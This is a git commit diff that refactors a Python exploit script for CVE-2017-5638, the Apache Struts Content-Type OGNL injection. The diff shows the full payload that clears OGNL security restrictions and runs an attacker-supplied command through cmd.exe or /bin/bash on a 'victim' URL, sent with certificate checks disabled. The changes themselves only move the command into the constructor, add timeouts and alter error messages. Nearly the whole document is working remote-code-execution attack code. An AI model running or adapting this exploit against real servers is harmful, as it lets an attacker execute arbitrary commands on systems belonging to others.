f3b3e28a364f8ba258f1ef67bbacb540428b048f
cocomelonc <cocomelonkz@gmail.com>
2021-02-21 03:53:30 +0600

    update CVE-2017-5638: some refactoring

--- cve_2017_5638.py
+++ cve_2017_5638.py
@@ -9,13 +9,14 @@ requests.packages.urllib3.disable_warnings()
 class CVE2017_5638:
     headers = {"User-Agent" : "Mozilla/5.0"}
 
-    def __init__(self, url):
+    def __init__(self, url, cmd):
         print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
         self.url = url.rstrip("/")
+        self.cmd = cmd
         self.session = requests.Session()
 
     # generate payload
-    def generate_payload(self, cmd):
+    def generate_payload(self):
         print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
         payload = "%{(#_='multipart/form-data')."
         payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -26,7 +27,7 @@ class CVE2017_5638:
         payload += "(#ognlUtil.getExcludedPackageNames().clear())."
         payload += "(#ognlUtil.getExcludedClasses().clear())."
         payload += "(#context.setMemberAccess(#dm))))."
-        payload += "(#cmd='%s')." % cmd
+        payload += "(#cmd='%s')." % self.cmd
         payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
         payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
         payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
@@ -38,12 +39,12 @@ class CVE2017_5638:
         print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)
 
     # exploitation
-    def exploit(self, cmd):
-        generate_payload(cmd)
+    def exploit(self):
+        self.generate_payload()
         print (LogColors.BLUE + "send payload with cmd..." + LogColors.ENDC)
         try:
             headers =  {"User-Agent" : "Mozilla/5.0", "Content-Type" : self.payload}
-            r = self.session.get(self.url, headers = headers, 
+            r = self.session.get(self.url, headers = headers, timeout = 7,
                 verify = False, allow_redirects = False)
             result = r.text
         except requests.exceptions.ChunkedEncodingError:
@@ -51,19 +52,19 @@ class CVE2017_5638:
             print (LogColors.YELLOW + "another request..." + LogColors.ENDC)
             try:
                 result = b""
-                with self.session.get(self.url, headers = headers, allow_redirects = False, verify = False, stream = True) as r:
+                with self.session.get(self.url, headers = headers, allow_redirects = False, verify = False, stream = True, timeout = 7) as r:
                     for chunk in r.iter_content():
                         result += chunk
             except requests.exceptions.ChunkedEncodingError as e:
-                print (LogColors.RED + "server connection closed :(" + LogColors.ENDC)
-                print (LogColors.RED + str(e) + LogColors.ENDC)
+                print (LogColors.RED + "server connection closed. :(" + LogColors.ENDC)
+                #print (LogColors.RED + str(e) + LogColors.ENDC)
             except Exception as e:
                 result = "errorrrrr. kittens wanna cry :("
             if type(result) != str:
                 result = result.decode('utf-8')
             return result
         except Exception as e:
-            result = "error. kittens wanna cry :("
+            result = "errorrrrr. kittens wanna cry :("
             print (LogColors.RED + str(e) + LogColors.ENDC)
         return result
 
@@ -74,5 +75,5 @@ if __name__ == '__main__':
     args = vars(parser.parse_args())
     url, cmd = args['url'], args['cmd']
     cve = CVE2017_5638(url, cmd)
-    cve.exploit(cmd)
+    print (cve.exploit())
 
